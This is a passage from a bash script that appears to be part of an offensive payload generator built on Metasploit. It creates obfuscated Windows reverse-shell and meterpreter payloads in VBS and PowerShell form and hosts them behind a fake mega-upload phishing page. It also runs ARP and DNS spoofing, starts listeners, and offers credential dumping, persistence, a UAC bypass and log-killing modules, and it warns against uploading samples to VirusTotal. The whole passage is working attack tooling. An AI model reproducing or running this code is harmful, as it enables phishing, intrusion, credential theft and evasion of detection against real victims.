    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH

  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# --------------------------------------------------------
# build shellcode in VBS (obfuscated using ANCII) 
# It was Working in 'Suryia Prakash' rat.vbs obfuscation
# that led me here... (build a vbs obfuscated payload) :D
# --------------------------------------------------------
sh_shellcode13 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ VBS NAME ☠" --text "example: shellcode" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> vbs format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : VBS -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i 9 -f vbs > $IPATH/obfuscate/$N4m.vbs" > /dev/null 2>&1
echo "[☠] encoded -> shikata_ga_nai"
sleep 2
cat $IPATH/obfuscate/$N4m.vbs | grep '"' | awk {'print $3'} | cut -d '=' -f1
# obfuscating payload.vbs
echo "[☠] Obfuscating sourcecode..."
sleep 2
cd $IPATH/obfuscate/
xterm -T " VBS-OBFUSCATOR.PY " -geometry 110x23 -e "python vbs-obfuscator.py $N4m.vbs final.vbs"
cp final.vbs $IPATH/output/$N4m.vbs > /dev/null 2>&1
rm $N4m.vbs > /dev/null 2>&1
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
cd $IPATH/

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.vbs" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 180) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       fi


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


# ZIP payload files before sending? (apache2)
rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      echo "[☠] creating archive -> $N4m.zip"
      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    else
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.vbs|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    fi

        if [ "$D0M4IN" = "YES" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
cd $IPATH/
}





# ----------------------------------------------------
# build shellcode in PSH-CMD (powershell base64 enc)
# embbebed into one .vbs template
# ----------------------------------------------------
sh_shellcode14 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PSH-CMD -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`

# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


   # check if exec.vbs as generated
   if [ -e $IPATH/templates/exec.vbs ]; then
      echo "[☠] exec.vbs  -> found!"
      sleep 2
 
   else

      echo "[☠] exec.vbs  -> not found!"
      exit
      fi


# injecting shellcode into name
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
sed "s|InJ3C|$disp|" exec.vbs > $N4m.vbs
mv $N4m.vbs $IPATH/output/$N4m.vbs
chmod +x $IPATH/output/$N4m.vbs



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.vbs\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.vbs" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.vbs on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.vbs|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.vbs|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.vbs|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


# ZIP payload files before sending? (apache2)
rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      echo "[☠] creating archive -> $N4m.zip"
      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    else
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.vbs|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    fi


        if [ "$D0M4IN" = "YES" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
